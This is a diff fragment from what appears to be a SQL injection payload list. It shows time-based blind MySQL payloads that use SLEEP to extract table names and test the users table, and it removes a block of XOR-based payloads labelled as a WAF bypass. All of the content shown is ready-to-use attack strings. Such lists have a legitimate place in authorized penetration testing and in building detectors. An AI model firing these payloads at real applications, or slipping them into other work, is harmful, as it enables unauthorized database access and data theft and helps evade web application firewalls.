@@ -21,7 +21,3 @@
 ' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u',SLEEP(5),0)--
 ' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
 
-# --- XOR-based (WAF bypass) ---
-'XOR(if(now()=sysdate(),sleep(5),0))XOR'
-'||(SELECT 0x74657374 WHERE 1=1 AND SLEEP(5))--
-0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'
